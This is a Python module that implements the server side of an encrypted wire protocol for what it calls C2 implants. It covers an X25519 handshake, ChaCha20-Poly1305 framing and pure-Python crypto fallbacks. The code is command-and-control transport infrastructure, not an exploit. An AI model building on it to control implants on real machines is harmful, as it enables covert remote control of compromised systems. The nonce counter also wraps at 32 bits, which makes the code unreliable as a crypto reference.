#!/usr/bin/env python3
"""
cybc2.py — CYBERDEMONS C2 "CYB3" protocol, server side.

Speaks the same wire format as the C/C++ implants (cybproto.h):

    off  size  field
      0     2  magic        0xCB 0x03
      2     1  type
      3     1  flags
      4     4  seq          big-endian
      8     4  ct_len
     12    12  nonce        4-byte session prefix || 8-byte BE counter
     24     N  ciphertext
   24+N    16  Poly1305 tag

Session setup is a PSK-authenticated ephemeral X25519 exchange, so the traffic
is ChaCha20-Poly1305 with forward secrecy and per-direction keys.

Dependency policy
-----------------
hashlib/hmac are stdlib, so the KDF side always works.  For the AEAD and X25519
we use `cryptography` when it is installed and fall back to a self-contained
pure-Python implementation otherwise, keeping "flask is the only dependency"
true.  Both paths are required to produce identical bytes; cybtest verifies it.
"""

import hashlib
import hmac
import os
import threading
import struct

MAGIC = b"\xcb\x03"
VERSION = 3
HDR_LEN = 24
AAD_LEN = 12
TAG_LEN = 16
NONCE_LEN = 12
MAX_PLAINTEXT = 16 * 1024 * 1024

T_HELLO = 0x01
T_HELLOACK = 0x02
T_CMD = 0x10
T_RESP = 0x11
T_PING = 0x20
T_PONG = 0x21
T_BYE = 0x30
T_ERR = 0x7F

HELLO_BODY = 32 + 16
HELLO_FRAME = HELLO_BODY + TAG_LEN

L_AUTH = b"CYBERDEMONS-C2-v3-hello"
L_SESSION = b"CYBERDEMONS-C2-v3 session"
L_KEYS = b"cyb3 keys"

# --------------------------------------------------------------------------
# backend selection
# --------------------------------------------------------------------------

try:
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
    from cryptography.hazmat.primitives.asymmetric.x25519 import (
        X25519PrivateKey, X25519PublicKey)
    _CCP = ChaCha20Poly1305
    HAVE_CRYPTOGRAPHY = True
except Exception:                                        # pragma: no cover
    ChaCha20Poly1305 = None
    _CCP = None
    HAVE_CRYPTOGRAPHY = False


def _fast_seal(key: bytes, nonce: bytes, aad: bytes, pt: bytes):
    """Seal with the accelerated backend, regardless of the current _CCP value.

    Separate from aead_seal() so the test suite can compare both paths even
    after it has hidden _CCP to force the pure-Python one.
    """
    if not HAVE_CRYPTOGRAPHY:
        return _aead_seal_python(key, nonce, aad, pt)
    blob = ChaCha20Poly1305(key).encrypt(nonce, pt, aad)
    return blob[:-TAG_LEN], blob[-TAG_LEN:]


# --------------------------------------------------------------------------
# pure-Python fallbacks
# --------------------------------------------------------------------------

_P = 2 ** 255 - 19
_A24 = 121665


def _x25519_python(scalar: bytes, u: bytes) -> bytes:
    k = bytearray(scalar)
    k[0] &= 248
    k[31] &= 127
    k[31] |= 64
    k = int.from_bytes(k, "little")
    x1 = int.from_bytes(u, "little") & ((1 << 255) - 1)
    x2, z2, x3, z3, swap = 1, 0, x1, 1, 0
    for t in range(254, -1, -1):
        kt = (k >> t) & 1
        swap ^= kt
        if swap:
            x2, x3 = x3, x2
            z2, z3 = z3, z2
        swap = kt
        a = (x2 + z2) % _P
        aa = a * a % _P
        b = (x2 - z2) % _P
        bb = b * b % _P
        e = (aa - bb) % _P
        c = (x3 + z3) % _P
        d = (x3 - z3) % _P
        da = d * a % _P
        cb = c * b % _P
        x3 = pow(da + cb, 2, _P)
        z3 = x1 * pow(da - cb, 2, _P) % _P
        x2 = aa * bb % _P
        z2 = e * (aa + _A24 * e) % _P
    if swap:
        x2, x3 = x3, x2
        z2, z3 = z3, z2
    return ((x2 * pow(z2, _P - 2, _P)) % _P).to_bytes(32, "little")


def _rotl32(v, n):
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF


def _chacha20_python(key: bytes, counter: int, nonce: bytes, data: bytes) -> bytes:
    const = (0x61707865, 0x3320646E, 0x79622D32, 0x6B206574)
    kw = struct.unpack("<8I", key)
    nw = struct.unpack("<3I", nonce)
    out = bytearray()
    for blk in range(0, max(len(data), 1), 64):
        st = list(const) + list(kw) + [counter + blk // 64] + list(nw)
        x = list(st)
        for _ in range(10):
            for a, b, c, d in ((0, 4, 8, 12), (1, 5, 9, 13), (2, 6, 10, 14), (3, 7, 11, 15),
                               (0, 5, 10, 15), (1, 6, 11, 12), (2, 7, 8, 13), (3, 4, 9, 14)):
                x[a] = (x[a] + x[b]) & 0xFFFFFFFF
                x[d] = _rotl32(x[d] ^ x[a], 16)
                x[c] = (x[c] + x[d]) & 0xFFFFFFFF
                x[b] = _rotl32(x[b] ^ x[c], 12)
                x[a] = (x[a] + x[b]) & 0xFFFFFFFF
                x[d] = _rotl32(x[d] ^ x[a], 8)
                x[c] = (x[c] + x[d]) & 0xFFFFFFFF
                x[b] = _rotl32(x[b] ^ x[c], 7)
        ks = b"".join(struct.pack("<I", (x[i] + st[i]) & 0xFFFFFFFF) for i in range(16))
        chunk = data[blk:blk + 64]
        out += bytes(a ^ b for a, b in zip(chunk, ks))
    return bytes(out[:len(data)])


def _poly1305_python(key: bytes, msg: bytes) -> bytes:
    r = int.from_bytes(key[:16], "little") & 0x0FFFFFFC0FFFFFFC0FFFFFFC0FFFFFFF
    s = int.from_bytes(key[16:], "little")
    p = (1 << 130) - 5
    acc = 0
    for i in range(0, len(msg), 16):
        blk = msg[i:i + 16]
        n = int.from_bytes(blk + b"\x01", "little")
        acc = ((acc + n) * r) % p
    return ((acc + s) & ((1 << 128) - 1)).to_bytes(16, "little")


def _pad16(b: bytes) -> bytes:
    return b"\x00" * ((16 - len(b) % 16) % 16)


def _poly1305_input(aad: bytes, ct: bytes) -> bytes:
    return (aad + _pad16(aad) + ct + _pad16(ct) +
            struct.pack("<Q", len(aad)) + struct.pack("<Q", len(ct)))


def _aead_seal_python(key: bytes, nonce: bytes, aad: bytes, pt: bytes):
    otk = _chacha20_python(key, 0, nonce, b"\x00" * 64)[:32]
    ct = _chacha20_python(key, 1, nonce, pt) if pt else b""
    # The tag covers the CIPHERTEXT, never the plaintext.
    return ct, _poly1305_python(otk, _poly1305_input(aad, ct))


def _aead_open_python(key: bytes, nonce: bytes, aad: bytes, ct: bytes, tag: bytes):
    otk = _chacha20_python(key, 0, nonce, b"\x00" * 64)[:32]
    want = _poly1305_python(otk, _poly1305_input(aad, ct))
    if not hmac.compare_digest(want, tag):
        raise ValueError("AEAD authentication failed")
    return _chacha20_python(key, 1, nonce, ct) if ct else b""


# --------------------------------------------------------------------------
# public primitives
# --------------------------------------------------------------------------

def aead_seal(key: bytes, nonce: bytes, aad: bytes, pt: bytes):
    """Return (ciphertext, tag)."""
    if _CCP is not None:
        blob = _CCP(key).encrypt(nonce, pt, aad)
        return blob[:-TAG_LEN], blob[-TAG_LEN:]
    return _aead_seal_python(key, nonce, aad, pt)


def aead_open(key: bytes, nonce: bytes, aad: bytes, ct: bytes, tag: bytes):
    """Return the plaintext, or raise ValueError on authentication failure."""
    if _CCP is not None:
        return _CCP(key).decrypt(nonce, ct + tag, aad)
    return _aead_open_python(key, nonce, aad, ct, tag)


def x25519(priv: bytes, peer_pub: bytes) -> bytes:
    if HAVE_CRYPTOGRAPHY:
        return X25519PrivateKey.from_private_bytes(priv).exchange(
            X25519PublicKey.from_public_bytes(peer_pub))
    return _x25519_python(priv, peer_pub)


def x25519_pub(priv: bytes) -> bytes:
    if HAVE_CRYPTOGRAPHY:
        return X25519PrivateKey.from_private_bytes(priv).public_key().public_bytes_raw()
    base = (9).to_bytes(32, "little")
    return _x25519_python(priv, base)


def x25519_keypair():
    priv = os.urandom(32)
    k = bytearray(priv)
    k[0] &= 248
    k[31] &= 127
    k[31] |= 64
    priv = bytes(k)
    return priv, x25519_pub(priv)


def hkdf(ikm: bytes, salt: bytes, info: bytes, length: int) -> bytes:
    if not salt:
        salt = b"\x00" * 32
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, c = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([c]), hashlib.sha256).digest()
        okm += t
        c += 1
    return okm[:length]


def auth_key(psk: bytes) -> bytes:
    return hmac.new(psk, L_AUTH, hashlib.sha256).digest()


def load_psk(text) -> bytes:
    """Accept 64 hex chars or 32 raw bytes; always return 32 bytes."""
    if isinstance(text, (bytes, bytearray)):
        if len(text) == 32:
            return bytes(text)
        text = text.decode("ascii", "ignore")
    text = text.strip()
    if len(text) == 64:
        try:
            return bytes.fromhex(text)
        except ValueError:
            pass
    if len(text) == 32:
        return text.encode("latin-1")
    raise ValueError(f"unusable PSK: {len(text)} chars")


# --------------------------------------------------------------------------
# handshake
# --------------------------------------------------------------------------

def build_hello(is_ack: bool, akey: bytes, own_pub: bytes, own_nonce: bytes,
                peer_pub: bytes = None, peer_nonce: bytes = None) -> bytes:
    body = own_pub + own_nonce
    tr = (b"A" if is_ack else b"H") + body
    if is_ack and peer_pub and peer_nonce:
        tr += peer_pub + peer_nonce
    body += hmac.new(akey, tr, hashlib.sha256).digest()[:TAG_LEN]
    hdr = MAGIC + bytes([T_HELLOACK if is_ack else T_HELLO, 0])
    hdr += struct.pack(">I", 0) + struct.pack(">I", len(body)) + b"\x00" * 12
    return hdr + body


def verify_hello(body: bytes, is_ack: bool, akey: bytes,
                 peer_pub: bytes = None, peer_nonce: bytes = None):
    """Verify against the bytes actually received; return (pub, nonce) or raise."""
    if len(body) != HELLO_FRAME:
        raise ValueError("bad hello length")
    if is_ack and (peer_pub is None or peer_nonce is None):
        raise ValueError("HELLOACK needs the peer values")
    tr = (b"A" if is_ack else b"H") + body[:HELLO_BODY]
    if is_ack:
        tr += peer_pub + peer_nonce
    want = hmac.new(akey, tr, hashlib.sha256).digest()[:TAG_LEN]
    if not hmac.compare_digest(want, body[HELLO_BODY:]):
        raise ValueError("hello tag mismatch")
    return body[:32], body[32:HELLO_BODY]


def derive_session(psk: bytes, priv: bytes, peer_pub: bytes,
                   c_nonce: bytes, s_nonce: bytes):
    """Return (k_c2s, k_s2c, pfx_c2s, pfx_s2c) -- canonical direction order."""
    shared = x25519(priv, peer_pub)
    if shared == b"\x00" * 32:
        raise ValueError("low-order peer key")
    session = hkdf(psk + shared, c_nonce + s_nonce, L_SESSION, 32)
    master = hkdf(session, b"", L_KEYS, 72)
    return (master[0:32], master[32:64], master[64:68], master[68:72])


# --------------------------------------------------------------------------
# session
# --------------------------------------------------------------------------

class Session:
    """One authenticated CYB3 conversation.

    Threading: the receive side (feed/recv) is touched only by the connection's
    own reader thread, so it needs no lock. The send side is NOT safe without
    one -- every HTTP handler that queues a command reaches sess.send() from
    its own Flask worker thread, and Flask runs threaded=True. Two concurrent
    sends both read self.tx_seq, both build the same nonce from it, and both
    then increment it. That produces either a duplicate sequence number, which
    the peer's replay window drops, or ChaCha20-Poly1305 nonce reuse, which
    leaks the keystream and breaks the AEAD outright. _tx_lock makes
    read-seq -> seal -> sendall atomic per session.
    """

    def __init__(self, k_send, k_recv, pfx_send, pfx_recv):
        self.k_send, self.k_recv = k_send, k_recv
        self.n_send, self.n_recv = pfx_send, pfx_recv
        self.tx_seq = 0
        self.rx_next = 0
        self.buf = bytearray()
        self._tx_lock = threading.Lock()

    @classmethod
    def client(cls, psk, priv, peer_pub, c_nonce, s_nonce):
        k_c2s, k_s2c, p_c2s, p_s2c = derive_session(psk, priv, peer_pub, c_nonce, s_nonce)
        return cls(k_c2s, k_s2c, p_c2s, p_s2c)

    @classmethod
    def server(cls, psk, priv, peer_pub, c_nonce, s_nonce):
        k_c2s, k_s2c, p_c2s, p_s2c = derive_session(psk, priv, peer_pub, c_nonce, s_nonce)
        return cls(k_s2c, k_c2s, p_s2c, p_c2s)

    # ---------------- send ----------------

    def seal(self, ftype: int, payload: bytes) -> bytes:
        if len(payload) > MAX_PLAINTEXT:
            raise ValueError("payload too large")
        if self.tx_seq >= 0xFFFFFFFFFFFFFFFF:
            raise ValueError("tx counter exhausted")
        nonce = self.n_send + b"\x00" * 4 + struct.pack(">I", self.tx_seq & 0xFFFFFFFF)
        hdr = MAGIC + bytes([ftype, 0])
        hdr += struct.pack(">I", self.tx_seq & 0xFFFFFFFF)
        hdr += struct.pack(">I", len(payload)) + nonce
        ct, tag = aead_seal(self.k_send, nonce, hdr[:AAD_LEN], payload)
        self.tx_seq += 1
        return hdr + ct + tag

    def send(self, sock, ftype: int, payload: bytes = b""):
        # Hold the lock across seal() *and* sendall(): two threads sharing one
        # tx counter would otherwise emit duplicate sequence numbers, and for
        # ChaCha20-Poly1305 a repeated nonce is a full keystream compromise.
        with self._tx_lock:
            frame = self.seal(ftype, payload)
            sock.sendall(frame)

    # ---------------- receive ----------------

    def feed(self, data: bytes):
        cap = HDR_LEN + MAX_PLAINTEXT + TAG_LEN
        if len(self.buf) + len(data) > cap:
            raise ValueError("inbound buffer overflow")
        self.buf += data

    def recv(self):
        """Return (type, plaintext) or None when more bytes are needed.

        Raises ValueError on any protocol violation, which the caller should
        treat as "drop the connection".
        """
        if len(self.buf) < HDR_LEN:
            return None
        ftype = self.buf[2]
        if self.buf[:2] != MAGIC:
            raise ValueError("bad magic")
        if self.buf[3] != 0:
            raise ValueError("bad flags")
        if ftype not in (T_CMD, T_RESP, T_PING, T_PONG, T_BYE, T_ERR):
            raise ValueError(f"unknown frame type {ftype:#x}")
        seq, ctlen = struct.unpack(">II", bytes(self.buf[4:12]))
        if ctlen > MAX_PLAINTEXT:
            raise ValueError("declared length too large")
        total = HDR_LEN + ctlen + TAG_LEN
        if len(self.buf) < total:
            return None
        if seq != self.rx_next:
            raise ValueError(f"out-of-order seq {seq}, expected {self.rx_next}")
        nonce = bytes(self.buf[12:24])
        if nonce[4:8] != b"\x00" * 4 or struct.unpack(">I", nonce[8:12])[0] != seq:
            raise ValueError("nonce counter does not match seq")
        if not hmac.compare_digest(nonce[:4], self.n_recv):
            raise ValueError("nonce prefix mismatch")
        hdr = bytes(self.buf[:HDR_LEN])
        ct = bytes(self.buf[HDR_LEN:HDR_LEN + ctlen])
        tag = bytes(self.buf[HDR_LEN + ctlen:total])
        pt = aead_open(self.k_recv, nonce, hdr[:AAD_LEN], ct, tag)   # raises on tamper
        del self.buf[:total]
        self.rx_next = seq + 1
        return ftype, pt


def recv_exact(sock, n: int) -> bytes:
    """Read exactly n bytes or raise."""
    out = b""
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            raise ConnectionError("peer closed during handshake")
        out += chunk
    return out


def server_handshake(sock, psk: bytes):
    """Perform the server side of the CYB3 handshake on a connected socket.

    Returns (session, client_pub, client_nonce) or raises.
    """
    akey = auth_key(psk)
    frame = recv_exact(sock, HDR_LEN + HELLO_FRAME)
    if frame[:2] != MAGIC or frame[2] != T_HELLO or frame[3] != 0:
        raise ValueError("expected a CYB3 HELLO")
    if struct.unpack(">I", frame[8:12])[0] != HELLO_FRAME:
        raise ValueError("bad HELLO length")
    cli_pub, cli_nonce = verify_hello(frame[HDR_LEN:], False, akey)

    priv, pub = x25519_keypair()
    s_nonce = os.urandom(16)
    sock.sendall(build_hello(True, akey, pub, s_nonce, cli_pub, cli_nonce))

    # derive_session() takes *our* private key and the *peer's* public key,
    # so the client's key is what belongs in peer_pub here.
    sess = Session.server(psk, priv, cli_pub, cli_nonce, s_nonce)
    return sess, cli_pub, cli_nonce


def client_handshake(sock, psk: bytes):
    """Perform the client side of the handshake; returns (session, priv)."""
    akey = auth_key(psk)
    priv, pub = x25519_keypair()
    c_nonce = os.urandom(16)
    sock.sendall(build_hello(False, akey, pub, c_nonce))

    frame = recv_exact(sock, HDR_LEN + HELLO_FRAME)
    if frame[:2] != MAGIC or frame[2] != T_HELLOACK or frame[3] != 0:
        raise ValueError("expected a CYB3 HELLOACK")
    if struct.unpack(">I", frame[8:12])[0] != HELLO_FRAME:
        raise ValueError("bad HELLOACK length")
    srv_pub, s_nonce = verify_hello(frame[HDR_LEN:], True, akey, pub, c_nonce)

    sess = Session.client(psk, priv, srv_pub, c_nonce, s_nonce)
    return sess, priv
